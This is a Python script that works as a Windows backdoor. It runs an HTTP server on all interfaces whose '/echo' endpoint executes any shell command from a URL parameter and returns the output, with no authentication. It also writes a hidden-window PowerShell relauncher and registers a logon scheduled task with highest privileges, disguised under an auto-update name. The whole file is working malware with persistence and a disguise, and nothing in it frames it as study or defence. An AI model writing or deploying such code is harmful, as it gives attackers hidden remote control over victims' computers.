import http.server
import socketserver
import subprocess
import sys
import os
from urllib.parse import urlparse, parse_qs, unquote

RUNNING_PORT = 11521
SCRIPT_HIDDEN = 'start_updater.ps1'
TASK_NAME = 'AutoUpdateFF2022'

class MyRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        parsed_url = urlparse(self.path)
        if parsed_url.path == '/echo':
            query_params = parse_qs(parsed_url.query)
            if 'command' in query_params:
                command = unquote(query_params['command'][0])
                output = self.execute_command(command)
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(output.encode())
                return
        # If the URL is not recognized or no command is provided, return a 404 error.
        self.send_response(404)
        self.end_headers()
        self.wfile.write(b'Not Found')

    def execute_command(self, command):
        try:
            result = subprocess.run(command, shell=True, capture_output=True)
            return result.stdout.decode()
        except Exception as e:
            return f"Error executing command: {str(e)}"

def create_powershell_script():
    current_exe_path = sys.argv[0]  # Path to the current executable
    script_content = f"""
Start-Process -FilePath '{current_exe_path}' -WindowStyle Hidden
"""

    with open(SCRIPT_HIDDEN, 'w') as ps_script:
        ps_script.write(script_content)

def add_to_scheduler():
    powershell_script_path = os.path.abspath(SCRIPT_HIDDEN)
    trigger_command = f'SchTasks /Create /SC ONLOGON /TN "{TASK_NAME}" /TR "powershell.exe -ExecutionPolicy Bypass -File \\"{powershell_script_path}\\"" /RL HIGHEST /F'
    subprocess.run(trigger_command, shell=True)

if __name__ == '__main__':
    create_powershell_script()
    add_to_scheduler()

    # Set up the server on port 8000
    handler = MyRequestHandler
    httpd = socketserver.TCPServer(('0.0.0.0', RUNNING_PORT), handler)

    print(f"Server started on port {RUNNING_PORT}")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
